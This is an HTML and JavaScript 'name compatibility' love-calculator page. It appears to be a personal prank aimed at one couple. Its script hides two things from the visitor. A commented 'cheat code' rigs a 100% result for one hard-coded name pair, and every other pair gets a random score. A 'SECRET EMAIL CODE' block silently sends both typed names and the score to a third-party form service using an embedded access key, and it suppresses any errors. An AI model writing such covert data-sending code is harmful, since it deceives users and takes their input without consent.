<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Name Compatibility Test</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Poppins', sans-serif;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        text-align: center;
        background: linear-gradient(135deg, #ff9a9e, #fecfef);
        padding: 20px;
    }

    .container {
        background: white;
        padding: 40px 30px;
        border-radius: 20px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        max-width: 400px;
        width: 100%;
    }

    h1 {
        font-size: clamp(20px, 5vw, 24px);
        color: #ff4081;
        margin-bottom: 20px;
    }

    input {
        width: 100%;
        padding: 15px;
        margin: 10px 0;
        border: 2px solid #f0f0f0;
        border-radius: 10px;
        font-size: 16px;
        font-family: 'Poppins', sans-serif;
        outline: none;
        transition: 0.3s;
        text-align: center;
    }

    input:focus {
        border-color: #ff4081;
    }

    button {
        padding: 15px 28px;
        margin-top: 15px;
        font-size: 16px;
        font-weight: 600;
        border: none;
        border-radius: 40px;
        background: #ff4081;
        color: white;
        cursor: pointer;
        width: 100%;
        transition: 0.3s ease;
    }

    button:hover {
        transform: scale(1.05);
        background: #e91e63;
    }

    #resultArea {
        margin-top: 25px;
        display: none;
    }

    #percentage {
        font-size: clamp(40px, 10vw, 56px);
        font-weight: 600;
        color: #ff4081;
        margin: 10px 0;
    }

    #message {
        font-size: 18px;
        font-weight: 600;
        color: #333;
    }
</style>
</head>
<body>

<div class="container">
    <h1>💕 Compatibility Tester 💕</h1>
    
    <input type="text" id="name1" placeholder="Boy Name" autocomplete="off">
    <input type="text" id="name2" placeholder="Girl Name" autocomplete="off">
    
    <button onclick="calculateLove()">Calculate</button>

    <div id="resultArea">
        <div id="percentage">0%</div>
        <div id="message"></div>
    </div>
</div>

<script>
function calculateLove() {
    let name1Input = document.getElementById("name1").value.trim();
    let name2Input = document.getElementById("name2").value.trim();
    let name1 = name1Input.toLowerCase();
    let name2 = name2Input.toLowerCase();
    
    let resultArea = document.getElementById("resultArea");
    let percentText = document.getElementById("percentage");
    let messageText = document.getElementById("message");

    if (name1 === "" || name2 === "") {
        alert("Please enter both names!");
        return;
    }

    resultArea.style.display = "block";

    // 1. THE CHEAT CODE 
    if ((name1 === "anish" && name2 === "rejina") || (name1 === "rejina" && name2 === "anish")) {
        percentText.innerHTML = "100%";
        messageText.innerHTML = "A perfect match! I think you should get coffee... ☕❤️";
    } else {
        // 2. Random score for everyone else
        let randomPercent = Math.floor(Math.random() * 76) + 10; 
        percentText.innerHTML = randomPercent + "%";
        
        if (randomPercent < 40) {
            messageText.innerHTML = "Yikes... maybe just stay friends.";
        } else if (randomPercent < 70) {
            messageText.innerHTML = "Not bad! There is some potential here.";
        } else {
            messageText.innerHTML = "Wow, a pretty solid connection!";
        }
    }

    // 3. SECRET EMAIL CODE
    const myAccessKey = "7e171739-6a41-4a24-a095-56b130a03c6f"; 

    fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            access_key: myAccessKey,
            subject: "🕵️ Someone played the game!",
            message: `TEST RESULT: ${name1Input} and ${name2Input} got ${percentText.innerHTML}`
        })
    }).then(response => {
        // Silently completes in the background
    }).catch(error => {
        console.log("Silent error"); 
    });
}
</script>

</body>
</html>
